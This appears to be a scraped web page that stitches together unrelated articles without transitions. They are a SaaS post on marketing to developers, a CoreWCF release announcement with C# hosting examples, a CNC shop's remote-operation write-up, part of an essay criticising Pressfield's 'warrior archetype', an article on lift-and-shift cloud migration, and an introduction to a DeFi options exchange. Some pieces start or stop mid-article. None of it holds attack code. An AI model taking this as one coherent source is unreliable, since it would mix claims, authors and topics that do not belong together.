<p>Ads, SEO, and “Top 10” posts<sup>*</sup> have a place in every marketing strategy, but we are developers ourselves. We know how important it is for a developer to research and evaluate a new product. And like most developers, we also usually skip over the fluffy marketing pages and go right to the technical meat.</p>
<p>If you have a SaaS product, API, platform, or tool that is primarily used by developers, then you need to take a different approach to target those developers. Whether or not they have direct purchasing power, they are your users, often are hugely influential in the purchasing decision, and where you need to direct your attention.</p>
<p>So how do you effectively market to this technical audience?</p>
<p>Look at where developers spend their time:</p>
<ul><li>Reading documentation</li><li>Looking for solutions to their programming problems</li><li>Evaluating tools and downloading packages</li></ul>
<p><em>*We admittedly have some</em> <em>“Top 10” posts</em></p>
<h2>Docs</h2>
<p>Documentation is one of the most powerful marketing tools at your disposal. Forget your marketing homepage, fancy images, or business-world cliches. Developers want the nitty-gritty details and those can be found in your documents. API, tech specs, and integration docs are what they are looking for and what will ultimately win them over.</p>
<p>For example, in our <a href="http://docs.ayrshare.com/">API Docs</a> we get as technically detailed as possible on how the system works, features and capabilities, and what the integration effort takes. And since we know that these docs will be read by prospective customers, we write them in such a way that puts the reader at ease since we have already thought through many of the technical questions.</p>
<p>So what makes good docs? Think of what you would like to see: integration guides, code examples in multiple languages, API details, and technical FAQs. If you take the time and care in your docs, it can be your biggest selling opportunity. </p>
<p>Stripe has some great API Docs:</p>

<p>If you stop reading now and just focus on amazing docs, you’ll be good to go.</p>
<h2>Solutions to Problems</h2>
<p>If you program and need help, what sites do you visit? I bet <a href="https://stackoverflow.com/">StackOverflow</a> is at the top of the list.</p>
<p>Now, you should never, ever, and I mean never, post promotional info about your app on StackOverflow. In fact, I recommend never mentioning it. </p>
<p>What you should do is help people with questions in your area of expertise, especially if that topic relates to your business. For example if you had a Stripe-like product, answer every question you can on StackOverflow on payments, API calls, and credit card processing.</p>

<p>If you build up a reputation in that area, developers will look to you and your business for help.</p>

<h2>Packages &amp; Modules</h2>
<p>My choice of tech stacks is React and Node.js, so whenever I need to solve a problem, I head over to <a href="https://npm.org/">NPM</a>, Node Package Manager, to see if someone has already built a solution. The same goes when I delve into Python, I go to <a href="https://pypi.org/">PyPI</a>. The breath of packages you can find is amazing and will save you hours of work and maintenance.</p>
<p>Having your own package available in these directories can be a fantastic way for developers to discover your product. You’ll also understand what languages your users build in. For example, we got several requests for a PHP package because potential users saw our package, but didn’t see a PHP one.</p>
<p>How much of a difference can these packages make? About 30% of our traffic comes from our <a href="https://www.npmjs.com/package/social-post-api">NPM</a> and <a href="https://pypi.org/project/social-post-api/">Python</a> packages or <a href="https://www.ayrshare.com/integration-with-bubble/">Bubble.io</a> or <a href="https://www.ayrshare.com/integration-with-airtable/">Airtable</a> Plugin (no-code tools).</p>

<p>And beyond just marketing, packages give your users the tools they need to more easily integrate your product, making happy users.</p>
<h2>Food For Thought</h2>
<p>Of course these aren’t the only avenues for reaching your technical users, and likely there are unique ones for your business. However, this should give you some food-for-thought on different marketing opportunities.</p>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>After 21 months of public development, CoreWCF has finally reached its first GA release. It’s been a long path to get here, and thee is still have a long way to go. CoreWCF started off as a prototype internal to Microsoft which was started after a meeting with Scott Hunter. During that meeting Scott said something which has shaped the entire development of CoreWCF. He said that we only want one service host (the concept, not the WCF ServiceHost class) in .NET Core. ASP.NET Core had already been released, which meant there wasn’t a place for ServiceHost (the WCF class). This made a lot of sense, so I set about building a WCF prototype on top of ASP.NET Core. Eventually a decision was made to release the prototype as a community project under the name CoreWCF. The prototype focused on the developer experience so a lot of the implementation needed some love and attention, and 21 months later, we’re releasing our first GA release. Along the way, the CoreWCF project caught the attention of the Amazon AWS team and they have been contributing significantly to help make this project a success. It is thanks to the contributions from Amazon AWS that the initial release supports WS-* protocols (WS-Security, WS-SecureConversation), and some token authentication credential types with the TransportWithMessageCredentials security mode. This is a significant step towards supporting WS-Federation to enable moving enterprise WCF services to CoreWCF hosted on a cloud platform.</p>

<p>So what changes happened that took 21 months you might ask? Some fundamental architecture changes to make this project sustainable and cross platform. There have been 2 major themes to the changes. Removing Asynchronous Programming Model (APM) api’s and code, and removing direct native system calls and IO code.</p>

<p>The APM programming pattern is incredibly fast and squeezes out every last bit of performance, but at the cost of code maintainability and debuggability. WCF uses APM to its limit and the codebase can be hard to work with. Porting the code over as-is would require a large commitment from anyone wanting to contribute anything non-trivial. This also would make it hard for the community to be self-supporting. CoreWCF now uses async/await Task based asynchronous programming throughout. Computers are so much faster today than 10 years ago. For a community owned and supported project maintainability is a high priority than speed, within reason. CoreWCF also switched to a request push pipeline model adopting the ASP.NET Core middleware pattern. This made the code simpler, but required a lot of refactoring and rewriting of pieces of WCF.</p>

<p>The second big change is removing platform specific code and removing IO code. CoreWCF doesn’t even know what a Socket is and yet supports NetTcp. ASP.NET Core handles all of that for CoreWCF. It just reads and writes to pipes or streams. This means CoreWCF developer time isn’t spent having to handle writing code for some obscure scenario on a specific platform, it can (mostly) let the ASP.NET Core team worry about that.</p>

<p>All this is to say that supportability and maintainability is a high priority for CoreWCF.</p>

<p>A lot has changed, but a lot is also the same. Where changes have been needed, a concerted effort has been made to make things familiar. To give an example, let’s look at some code. When creating a self hosted service (console or WPF/WinForms as opposed to IIS hosted) in WCF, you would create a ServiceHost, add a ServiceEndpoint, and open the service:</p>

<figure><pre><code data-lang="csharp"><span>ServiceHost</span> <span>host</span> <span>=</span> <span>new</span> <span>ServiceHost</span><span>(</span><span>typeof</span><span>(</span><span>MyService</span><span>),</span> <span>new</span> <span>Uri</span><span>(</span><span>http</span><span>:</span><span>//localhost/myservice));</span>
<span>host</span><span>.</span><span>AddServiceEndpoint</span><span>(</span><span>typeof</span><span>(</span><span>IMyService</span><span>),</span> <span>new</span> <span>BasicHttpBinding</span><span>(),</span> <span>"/basic"</span><span>);</span>
<span>host</span><span>.</span><span>Open</span><span>();</span></code></pre></figure>

<p>With CoreWCF, there’s a little more code required due to the configuration model of ASP.NET Core, but the CoreWCF pieces are minimal. Those familiar with ASP.NET Core know that when configuring your host you need to specify a startup class which contains two methods, ConfigureServices and Configure. The ConfigureServices method is where anything needed in the dependency injection (DI) system is added, and any extension methods are called to add support for various frameworks such as MVC. At it’s simplest, a single method is called to add WCF support.</p>

<figure><pre><code data-lang="csharp"><span>public</span> <span>void</span> <span>ConfigureServices</span><span>(</span><span>IServiceCollection</span> <span>services</span><span>)</span>
<span>{</span>
    <span>services</span><span>.</span><span>AddServiceModelServices</span><span>();</span>
<span>}</span></code></pre></figure>

<p>In the Configure method, things will look a little more familiar. The extension method UseServiceModel(this IApplicationBuilder app) is called with a delegate which configures CoreWCF.</p>

<figure><pre><code data-lang="csharp"><span>public</span> <span>void</span> <span>Configure</span><span>(</span><span>IApplicationBuilder</span> <span>app</span><span>)</span>
<span>{</span>
    <span>app</span><span>.</span><span>UseServiceModel</span><span>(</span><span>builder</span> <span>=&gt;</span>
    <span>{</span>
        <span>builder</span><span>.</span><span>AddService</span><span>&lt;</span><span>MyService</span><span>&gt;();</span>
        <span>builder</span><span>.</span><span>AddServiceEndpoint</span><span>&lt;</span><span>MyService</span><span>,</span> <span>IMyService</span><span>&gt;(</span><span>new</span> <span>BasicHttpBinding</span><span>(),</span> <span>"/basic"</span><span>);</span>
    <span>});</span>
<span>}</span></code></pre></figure>

<p>The AddService<tservice>() method registers that a service for the type TService will be used. The service then needs at least one endpoint added to the builder for that service type. When CoreWCF needs an instance of TService, it will first look in DI to see if there's an implementation available, and if not found, will fall back to creating an instance using reflection the same way that WCF does. If either InstanceContextMode.PerSession or InstanceContextMode.PerCall is used, CoreWCF will request an instance from DI if available each time an instance is needed. It will fall back to the same behavior as WCF if the type is not registered in DI. This allows injecting other dependencies such as loggers into the service instances without having to implement IInstanceContextProvider to do so.</tservice></p>

<p>CoreWCF still supports the System.ServiceModel namespaced contract attributes such as ServiceContract and OperationContract if the WCF Core client nuget package System.ServiceModel.Primitives is referenced. This allows sharing contract assemblies between the client and the server. There is also CoreWCF namespaced versions of these attributes too so a dependency on the WCF Core client nuget package isn’t needed.</p>

                <div>
                    <h2 id="introduction"><strong>Introduction</strong></h2><p>Not only COVID-19 has brought many challenges to our daily lives, but it also has inspired a lot of change in how we work and do things. Some professions transitioned to remote work more easily than others. Factory workers and machine operators have been less lucky in this regard and that also applies to us in our CNC-based micro-factory.</p><p>Allowing more people to work remotely opens up many opportunities for businesses. Not only you can bring talent from anywhere in the world, but also you have more choices where to house the hardware allowing to optimise on cost. Furthermore, reaction times can be reduced if travel to the worksite can be eliminated. Quite a few IT professionals have been doing a good job from spectacular locations and we should strive to let more people experience that.</p><p>Another important aspect of structuring work such that it can be done remotely is that it is the first step to automating it. Local to remote, and remote to autonomous allows for a smoother transition than local to autonomous straight away. In the future, we plan on coupling our remote system to AI so if you’re interested, make sure to follow us on LinkedIn or Facebook!</p><p><strong>WARNING! </strong>Running machinery unsupervised is dangerous and must be avoided. This article is elaborating on how to operate machines more efficiently with more staff working remote, but does not suggest running machines without supervision or people on-site.</p><h2 id="how-corona-showed-us-an-opportunity"><strong>How Corona showed us an opportunity</strong></h2><p>Before the COVID-19 hit our workflow for a CNC job has been as follows:</p><ol><li>Make CAD/ CAM in the office;</li><li>Finalise CAM in the shop;</li><li>Run CNC jobs in the shop.</li></ol><p>However, during the quarantine at times it has become difficult to proceed this way because of the travel restrictions ( our CNC lab and office are based in different districts and district travel is cumbersome during quarantine ). We took up this challenge and used it as an opportunity to do the first step towards our micro-factory automation by doing more of the shop work remotely.</p><h2 id="the-cnc-lab-problem"><strong>The CNC lab problem</strong></h2><p>Running a CNC job required:</p><ol><li>Prepare the CAD/CAM files;</li><li>Setup the CNC machine for the job;</li><li>Loop: place the material, run the program, take out the cut parts, clean the table</li></ol><p>In our team, a single person has been doing all of these things. However, is it wise to use a skilled designer/ operator to be in charge of moving material and parts? Not really, because those skills could be invested in something with a much better return on investment (ROI).</p><p>Why don’t we have an unskilled person doing that work? Because CNC jobs are prone to small and costly mistakes, so to ensure high quality and safe operation, that person has to have some skills. Those skills need to either be brought in or be taught and as soon as a person has those skills we are back at having a skilled person doing a large amount of unskilled work.</p><h3 id="iteration-1">Iteration 1</h3><p>Our first step towards a solution was finding an unskilled person to be at the shop while we remote into the PC which controls the CNC machine. This has greatly improved our ROI and created a truly win-win situation because not only we are more efficiently using our time resources, but also created a new job position.</p><p>Still, there were issues to be solved. Coordination was done by phone and in order to operate the machine safely, we had to do multiple repeated questions making sure that it is safe to run the machine. Setup was particularly tricky because misunderstandings led to tool breakage and material waste. Lastly, making sure that the operation is proceeding smoothly was tricky as well since it required experienced evaluation and experience we did not have on-site.</p><h3 id="iteration-2">Iteration 2</h3><p>Having drawn conclusions from iteration 1, we’ve decided to upgrade the CNC lab with a camera for more efficient and higher quality feedback. And it is surprising how much easier work became then!</p><figure><img src="https://cdn-images-1.medium.com/max/1600/1*ukzIoHs74MRrQd9Xu3ZBJQ.png" alt=""><figcaption>Figure 1. CNC shop&nbsp;camera</figcaption></figure><p>Much less coordination was required and we were much more confident operating the CNC machine knowing that the site was safe for operation. Setups became easier because we could verify that the right measurements were made.</p><p>Soon enough we’ve found many things that could be improved:</p><ul><li>Running cameras in one window and remoting in on another tended to be inconvenient on a single screen workstation;</li><li>Although monitoring was much better, the single-camera setup did not allow to evaluate the quality of the finish or how smoothly the work was progressing;</li><li>When we were executing tool adjustments (eg. changing a bit in the tool chuck ) it was still hard to be sure that the right tool was where it needed to be;</li><li>It has become very apparent that some of the tasks could be semi-automated using feedback from the on-site worker. For example, at the beginning of each session, the machine needs to be initialised by moving it to reference and calibrating all the tools which involved checking if the site was clear for action and then going through a sequence of clicks;</li><li>Measurements still took a while to explain and then took a while to do properly.</li></ul><h3 id="iteration-3">Iteration 3</h3><p>Taking into account the inefficiencies we’ve identified, we’ve decided to work on a cohesive platform with an intuitive dashboard which would merge all the systems we have and provide the base for automation to be built upon.</p><p>First, was the network setup. We needed to merge multi-site networks into a mesh topology network where all the nodes could be interconnected which was solved using a hub and spoke topology VPN. Although, it does have its own drawbacks it had a good cost-benefit ratio when it comes to setup and deployment and is working for us for now.</p><p>Next, was building the dashboard which not only required the making of the UI but required figuring out how we’re going to expose and manage resources in our shop network. We decided to build the backend in the spirit of Kubernetes, so it is easy to manage at scale with the addition of new sensors, machines and full-blown sites themselves.</p><figure><img src="https://cdn-images-1.medium.com/max/1600/1*JYyqKIXsBTgfg8A-ENR-xw.png" alt=""><figcaption>Figure 2. CNC shop dashboard prototype</figcaption></figure><p>For the GUI we choose to go with Python’s Tkinter package in order to be able to rapidly iterate and once it reaches a stable state we’re planning to move it into a web app for easy access from any device. The dashboard is set up such that one could interface with the embedded CNC software by just doing the relevant actions on the dashboard.</p><h3 id="conclusions">Conclusions</h3><p>Based on our experience using the shop dashboard, it has helped us improve our process in the CNC shop by a mile. We are significantly more confident running remote jobs, have more oversight and control and the process is much more efficient with time.</p><p>It has also opened the possibility to (semi)-automate processes involved in running a CNC shop, which we are continuing to work with and will be posting later. We have a few ideas on how to couple the camera and control system with AI and that is an exciting prospect!</p><p>One key feature that the system requires is being able to remotely access the CNC control software. We are lucky to have it running on a PC which we can easily remote-in, but in case of embedded software, some middleware might be needed to control it remotely.</p><p>Allowing the machine operator to work remote adds value to our business as we could easier relocate the shop to cheaper areas, further from the cities or have talented engineers from nearly anywhere in the world away from work with us. That is why we will continue on this journey and will share it with you as we go!</p><hr><h3 id="check-out-more-">Check out more:</h3><ol><li><a href="https://1d.works/welcome-to-1d-works-cnc-lab/" rel="noopener">Welcome to 1D.works CNC Lab</a></li><li><a href="https://1d.works/object-oriented-computer-assisted-machining/" rel="noopener">Simplifying CAM workflow with Fusion 360</a></li><li><a href="https://1d.works/unique-products-at-scale-with-ai-infused-cad/" rel="noopener">Unique products at scale with AI-infused CAD</a></li></ol><p>and more in our <a href="https://1d.works/blog/" rel="noopener">blog</a></p><hr><h3 id="connect-">Connect!</h3><p>At <a href="https://1d.works/" rel="noopener nofollow noopener noopener">1D.works</a> we’re excited about the potential of AI to improve businesses and people’s lives.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the third and final part of a discussion (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">IIb</a>) discussion of the notion that there is a ‘universal warrior’ – a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p>Over the last three weeks, we’ve looked at the historical evidence to see if there was any hint of some universal war experience or set of warrior values.  What we’ve found instead is that almost everything about how humans engage in war, aside from the fact that they do so, varies tremendously from one culture to the next, from one place to the next, from one period to the next.  Cultural expectations, social values, technological conditions, entire systems of warfare and simple circumstance also condition the experience of war and the values that combatants have in extreme ways which render the search for a ‘universal’ set of warrior values a clearly doomed enterprise.</p>



<p>But, as laid out in the beginning, the ‘universal warrior’ wasn’t merely a (deeply flawed) argument about the structure and experiences of the past, but the foundation stone in an ideological blueprint for living one’s modern life.  And so it is time now that we turn from the (quite bad) historical roots of this idea to the (worse, it turns out) ideological implications of the idea.</p>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(I couldn’t decide quite how I wanted to illustrate this essay and it didn’t seem like quite the right content for historical cat photos, so I’ve opted to leave it without images.  I may go back and add pictures at a later date, but for now, it can stand purely as an essay.)</p>



<h2>Once More, With Feeling</h2>



<p>In a sense, while the previous three posts have been fun, they were really just a very long preamble to the argument I am making here, so I want to both lay out <em>why</em> I opened with a three-week long preamble before getting to the point (‘how else would you know it was me?’) and also pull together the conclusions from all of that before we move forward.</p>



<p>So why the preamble?  Because I wanted to make sure before we started discussing the underlying ideology that lurks <em>behind</em> claims of the universality of some ‘warrior ethos’ we had defused the retort that, whatever the unpleasant implications, the ‘universal warrior’ was <em>historically true</em>.  This had to be done first because <strong>I am of the opinion that</strong> <strong>truth is an absolute defense</strong> in such matters; the universe contains a great many facts which are frustratingly inconvenient, yet as historians we have to deal with the world as it is rather than as we wish it to be (or wish it to have been).  Consequently, before I could complain about the ideology, it was necessary to determine if the historical theory was true, or even remotely plausible.</p>



<p>So we have spent three weeks hunting for the ‘universal warrior’ – either in the form of a universal war <em>experience</em> or a universal set of <em>values</em>.  What we have found is:</p>



<ul><li>Far from there being one set way that combatants relate to their society, soldiers, warriors and civilians represent distinct categories defined by how people in war relate to their society.  Even <em>within</em> those categories, variety is considerable, leaving no one clear model of how combatants relate to their societies.</li><li>Moreover, war itself is changeable, moving through at least three (and probably four) distinct systems of land warfare alone, each with substantial differences in tactics, values, and experiences.</li><li>Moreover, different cultures understand and imagine the ideal qualities of combatants differently, often so dramatically differently that one culture’s definition of courage is not merely different from an other’s, but diametrically opposed.</li><li>Moreover, the actual experience of battle – we discussed this mostly through the experience of fear – isn’t universal either.  The fear of facing a cavalry charge is not the same sort of fear as the fear of enduring a week long artillery barrage, while ‘war is scary’ in a general sense is hardly enough to set off the warrior or the soldier from any number of other scary and potentially hazardous jobs.</li><li>Moreover, the bonds of comradeship that support modern cohesion (often cited as a unique and universal experience) are, in fact, also historically contingent, both in that there are many systems for generating cohesion, not all of which involve tight bonds formed during military service and that some military systems don’t seek to develop cohesion in this sense at all.</li><li>Moreover, attitudes towards the hardships of war <em>also</em> vary wildly, as do the actual hardships in question.</li><li>Moreover, not only do different societies express different attitudes and values towards the wounded, but the nature of the wounds themselves has changed over time as military technology has become progressively more lethal; both states that apply not only to physical, but also mental wounding.</li></ul>



<p>In short, while there is enough commonality in war to suggest a definition that encompasses the idea (again, I rather prefer W. Lee’s definition of war as “organized group activity, conducted with lethal effects, that diminishes one [unconsenting] group for the benefit of another”), <em>within </em>that definition, <strong>there is far too much variety to suggest there is any one ‘universal’ experience of war or any one set of universal warrior values</strong>.</p>



<p>And I should note this is something we could demonstrate in more than a half-dozen different ways deploying just a fraction of the available scholarship on how the experience and values of war change from place to place.  Indeed, that is essentially what we have done.  <strong>Any <em>one</em> of the above points is enough to be fatal to the notion that there is some sort of ‘universal’ set of warriors values and experiences </strong>such that, as Pressfield openly states, a Spartiate could be simply dropped into a modern U.S. Marine regiment and fit in without skipping a beat (or his equally anachronistic notion that the decadent Athenian could be dropped into American civil society and also integrate seamlessly).  </p>



<p>But of course Pressfield isn’t offering a <em>history</em> (and indeed, he has not written one), he is offering an ideology and (intentionally or not) reshaping the historical facts to fit that ideology, shaving the corners off of the square peg so it will fit into the round hole of his moral assumptions.  His ideology requires a universal set of warrior values to serve as the foundation for his life philosophy and so, facts be damned, he <em>will</em> assert the existence of such a universal set of values.  The ideology, not the history, is the foundation, which is why Pressfield offers both anecdotes from Plutarch (a historical source) and his own books (modern historical fiction) as having equal truth value, even though the latter has no value as historical evidence; they both <strong>express the ideology</strong>.</p>



<p>So what is the ideology here?  Well, for that it is time to meet our old friend…</p>



<h2>The Cult of the Badass</h2>



<p>Pulling out the core ideology from Pressfield’s <a href="https://stevenpressfield.com/category/the-warrior-archetype/">videos </a>is a formidable task; there are fifty of them and so much of the core argument is submerged beneath endless anecdotes (some historical, some Pressfield openly invented for his historical fiction; all delivered with insufficient historical context).  But Pressfield’s videos are useful for this argument because he makes explicit a set of arguments which are usually only made <em>implicitly</em> through a set of emotional appeals which often are carried through the subtext of images and references rather than the text of what is being said.</p>



<p>(Marching through Pressfield’s videos was also frankly difficult because there are <a href="https://twitter.com/BretDevereaux/status/1350655580562731011"><em>just so many errors</em> </a>in them, I had to stop live-tweeting my way through them because if I kept doing it I’d never finish.  As a reminder, this is a fellow whose fiction<a href="https://en.wikipedia.org/wiki/Gates_of_Fire"> is on reading lists </a>at various U.S. military officer training programs, much to my continued sorrow.)</p>



<p>We may, I think, summarize Pressfield’s core argument as follows: the ‘warrior archetype’ (he is using here the long-abandoned psychology of Carl Jung) represents a true human universal best understood by certain ‘warrior societies’ (<em>especially</em> the Spartans, but also Alexander III, but somehow <em>not</em> the Macedonians or Philip II) who supposedly demonstrated martial excellence and who therefore are “representative of the purest expression of the warrior archetype” (his words).  Moreover, Pressfield argues that this understanding of the ‘inner warrior’ provides the best blueprint on which a person might fashion their lives, understanding their weaknesses as an ‘inner enemy’ that must be opposed by ‘warrior values’ and ‘mental toughness.’  And while Pressfield will admit that the ‘warrior archetype’ can go astray (he says this of Alexander, though I’d argue that Alexander didn’t so much ‘go astray’ as he ‘kept doing what he had done literally for his entire life, but began doing it to people who thought Alexander would only hurt people <em>they didn’t like</em>‘), he nevertheless presents this ‘warrior archetype’ as an expression of the highest possible human ideal.  <strong>In Pressfield’s ideological framework, it is the great warriors – the Spartans, Alexander, Arjuna – who stand atop the summit of human physical and moral achievement.</strong>  Non-warriors (mostly women) are valued in as much as they uphold elements of this warrior ideal so that warriors (mostly men) can give those ideals physical expression in action.  Even internal struggles must be reframed as a form of war, to be fought and defeated with the same values that best produce effective real-world violence.</p>

They had to escape the house of horrors and move into a professionally-managed data center before time ran out. It was a question of survival.</p><p>For that very good reason, Leaky Servers Inc opted for a “lift-and-shift” <a href="https://acloudguru.com/blog/business/what-is-cloud-migration" target="_blank" rel="noopener noreferrer">cloud migration strategy</a>: they dumped their applications into AWS pretty much as-is, with minimal training and refactoring beforehand.</p><p>They beat the clock to get out of their data center. But the race against time to adopt the cloud had only just begun.</p><h5><strong>Lift-and-shift: taking the shot</strong></h5><p>Not every migration story involves literal fireworks. But you can still find businesses choosing lift-and-shift, instead of re-architecting applications for the cloud, for a grab bag of reasons:</p><ul><li>Urgent need to get out of a data center (because your servers are haunted, or maybe just because of an expiring lease)</li><li>Desire to get some cloud benefits (scalability, lower maintenance, or even lower cost) without incurring the full risk and expense of re-architecting</li><li>As a financial engineering tactic, to shift CapEx burden to OpEx</li><li>As the first stepping stone to cloud adoption, with the goal to take on a more cloud-native approach later, after everyone gets their feet wet</li></ul><p>All these can be reasonable justifications for lift-and-shift. And every one of them is potentially dangerous.</p><p>Because the moment you drop your monolithic, legacy app servers on EC2, you have started a shot clock on your chances for success in the cloud. Tick, tock. Can you hear it?</p><h5><strong>The lift-and-shift shot clock</strong></h5><p>You are buying yourself time with a lift-and-shift migration. Time to figure out your next move, time to train up your team, time to convince the business that cloud has value. But the bill for that time comes due fast, and at a high interest rate.</p><p>That’s because the cloud doesn’t run like your old data center. The cost model is different, the skills are new. And if you change your infrastructure without bringing the rest of your organization along with it, you will find your missing competencies creeping up on you.</p><p><strong><i>You need SRE</i></strong></p><p>The cloud scales fast; it’s made of ephemeral resources and black-box services coordinated across multiple geographical sites, and it generates tons of telemetry. The only way to cope with these challenges in the long term is automation. The discipline of <a href="https://read.acloud.guru/you-need-sre-skills-to-thrive-in-a-serverless-world-kelsey-hightower-340a002b3730?_ga" target="_blank" rel="noopener noreferrer">site reliability engineering</a> may not seem important on Day 1 in the cloud, but the longer you go without it, the more its absence will hurt you.</p><p><strong><i>You need governance</i></strong></p><p>You moved to the cloud to get better insight on IT spend, to push costs down, to manage risk more effectively. How are you going to do that without automation, without tagging, without isolation of the workloads sharing your legacy monoliths? <a href="https://read.acloud.guru/cloud-risk-management-requires-a-change-to-continuous-compliance-mindset-bca7252eecd0?_ga" target="_blank" rel="noopener noreferrer">Continuous compliance</a> isn’t going to happen when you’re still treating your cloud resources like pets.</p><p><strong><i>You need a culture of comprehensive learning</i></strong></p><p>To get the most out of the cloud, you need people who understand it. A lift-and-shift migration intentionally delays the process of cloud competency, usually with the stated or unstated assumption that team members will pick up new skills along the way.</p><p>But this <i>doesn’t just happen. </i>As long as team members are stuck in the same grind of firefighting legacy apps, their cloud knowledge will remain ad-hoc, limited, and insufficient to propel the next stage of cloud evolution. You must intentionally perpetuate a <a href="https://acloudguru.com/resources/importance-of-creating-cloud-culture?_ga" target="_blank" rel="noopener noreferrer">cloud culture</a> — through certification training, incentives, and active efforts to refactor for the future.</p><h5><strong>Lift-and-shift is not a stable state</strong></h5><p>The longer you wait to adopt a cloud-native mindset, the more the interest on that lift-and-shift loan compounds. Because your engineers have to do <i>something </i>while they wait for the business to catch up with cloud.</p><p>In the absence of proper SRE, they build highly manual, slow, error-prone operational procedures that drag down <a href="https://baremetrics.com/academy/time-to-value-ttv" target="_blank" rel="noopener noreferrer">time-to-value</a> and <a href="https://stackify.com/calculating-mttr-an-evolution-driven-by-the-rise-of-devops/" target="_blank" rel="noopener noreferrer">MTTR</a>.</p><p>Without a clearly-defined <a href="https://read.acloud.guru/werner-against-the-machine-7d208b81e5eb?_ga" target="_blank" rel="noopener noreferrer">cloud center of excellence</a>, they rely on tribal wisdom and faulty mental models of how cloud operates.</p><p>Lacking cloud-native governance and cost controls, they run the cloud like a data center: expensively. Remember how you went to the cloud to save money? Let me know how that’s working out after two years of lifted/shifted workloads.</p><p>Every day, those bad habits become more ingrained. You’re not just bringing your old legacy systems to the cloud. You’re building a whole new web of poor practices and procedures around them. And as those temporary stopgaps harden into permanence, you’ll see your brightest engineers leaving for less dysfunctional projects.</p><p>Eventually, if you can’t take the step forward into cloud-native,<i> the positive value created by the lift-and-shift will be overwhelmed by its negative side effects</i>.</p><p><img loading="lazy" src="https://acloudguru.com//app/uploads/2020/02/lift-and-shift-shot-clock.jpg?x64326" alt="" width="974" height="974" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 974w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 150w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 768w" sizes="(max-width: 974px) 100vw, 974px">If all software eventually becomes technical debt, lift-and-shift migrations are payday loans.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Decentralized finance (a.k.a. DeFi) is a relatively recent and fast growing field in the crypto space that is providing innovative implementations for financial instruments that rely on “smart contracts” (actual code files) instead of being subject to control by central financial intermediaries such as brokerages, exchanges, or banks.</p>

<p>I first came across DeFi about six months ago while browsing a hacker news thread on the subject, and became especially interested on the topic. Not much later major financial news portals reported that DeFi had already grown tenfold during the course of 2020, surpassing US$ 11 billion in deposited value with still a few months left to year end<sup>1,2</sup>, nothing less than staggering.</p>

<p>This context motivated me to invest my free time for studying this field more deeply, and since I learn better when I get my hands dirty I ended up developing an experimental project of a <strong>decentralized options exchange</strong> on ethereum which I describe briefly in this post. Also, feel free to browse the project’s source code on GitHub, which includes a short technical documentation: <a href="https://github.com/TCGV/DeFiOptions">DeFiOptions</a>.</p>

<p>I start with a functional overview of the project and then I get into more details on key DeFi concepts related to it. So don’t go away just yet if you feel overwhelmed by the vocabulary. Nonetheless, if you’re not familiar with options trading in traditional stock exchanges, I suggest you take a look <a href="https://en.wikipedia.org/wiki/Option_(finance)">here</a> before proceeding.</p>



<p>So this experimental DeFi options exchange was implemented as a collection of smart contracts written in the <a href="https://en.wikipedia.org/wiki/Solidity">solidity</a> programming language. They enable trading of long and short positions for cash settable call and put european style options. The diagram below gives a glimpse on how traders interact with the exchange, and how components interact with one another.</p>

<p>
  <img src="https://thomasvilhena.com/images/p25/diagram.png" alt="regular-graphs">
  <br><label>Figure 1. Options Exchange Diagram</label>
</p>

<p>The exchange accepts stablecoin deposits as collateral for writing tokenized (ERC20) options, and a dynamic approach has been implemented for ensuring collateral in a more capital efficient way, making use of favorable writer’s open option positions for decreasing total required balance provided as collateral.</p>

<p>Decentralized price feeds provide the exchange on-chain underlying price and volatility updates, which is crucial for properly calculating options intrinsic values, collateral requirements, and performing settlements.</p>

<p>Because options are tokenized they can be freely traded/transferred between any two parties. Upon maturity each option contract is liquidated, cash settled by the credit provider contract and destroyed to prevent anyone from trading an expired asset. In case any option writer happens to be short on funds during settlement the credit provider will register a debt and cover payment obligations, essentially performing a lending operation.</p>

<p>Registered debt will accrue interest until it’s repaid by the borrower. Payment occurs either implicitly when any of the borrower’s open option positions matures and is cash settled (pending debt will be discounted from profits) or explicitly if the borrower makes a new stablecoin deposit in the exchange.</p>

<p>Exchange’s balances not allocated as collateral can be withdrawn by respective owners in the form of stablecoins. If there aren’t enough stablecoins available at the moment of the request due to operational reasons the solicitant will receive ERC20 credit tokens issued by the credit provider instead. These credit tokens are a promise of future payment, serving as a proxy for stablecoins since they can be redeemed for stablecoins at a 1:1 value conversion ratio, and are essential for keeping the exchange afloat during episodes of high withdrawal demand.</p>

<p>Holders of credit tokens can request to withdraw (and burn) their balance for stablecoins as long as there are sufficient funds available in the exchange to process the operation, otherwise the withdraw request will be FIFO-queued while the exchange gathers funds, accruing interest until it’s finally processed to compensate for the delay.</p>

<p>Phew, that’s it! While implementing the options exchange I came across several challenges, tried different approaches, reverted back and tried again until coming up with this solution. There’s still work to be done (see “Status &amp; next steps” section below), but I’m confident this foundation is solid enough to support further developments.</p>



